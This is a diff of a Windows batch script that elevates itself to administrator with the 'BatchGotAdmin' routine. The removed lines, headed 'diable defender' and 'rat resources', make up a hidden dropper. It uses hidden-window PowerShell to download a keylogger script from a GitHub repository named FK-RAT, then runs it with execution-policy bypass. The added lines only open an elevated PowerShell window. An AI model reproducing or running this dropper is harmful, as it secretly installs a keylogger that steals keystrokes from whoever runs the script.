@@ -1,6 +1,3 @@
-REM get admin permissions for script
-@echo off
-
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> check for permissions
@@ -29,9 +26,5 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-REM diable defender
-
-
-REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/Sunnickel/FK-RAT/raw/main/resources/keylogger-pwsh/keylogger.ps1 -OutFile install.ps1"; 
-powershell Start-Process -windowstyle hidden -ep bypass "install.ps1"
+    REM you can remove "powershell" to run admin CMD
+    powershell Start-Process powershell.exe 
